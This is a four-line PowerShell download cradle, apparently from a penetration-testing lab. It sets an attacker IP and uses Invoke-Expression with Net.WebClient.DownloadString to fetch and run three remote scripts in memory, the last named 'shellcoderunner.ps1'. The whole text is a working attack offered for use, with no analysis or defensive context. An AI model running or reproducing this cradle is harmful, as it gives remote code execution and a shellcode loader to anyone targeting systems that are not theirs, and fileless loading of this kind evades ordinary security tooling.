$ip = '192.168.45.197'
iex (New-Object Net.WebClient).DownloadString("http://$ip/1.txt")
iex (New-Object Net.WebClient).DownloadString("http://$ip/2.txt")
iex (New-Object Net.WebClient).DownloadString("http://$ip/shellcoderunner.ps1")
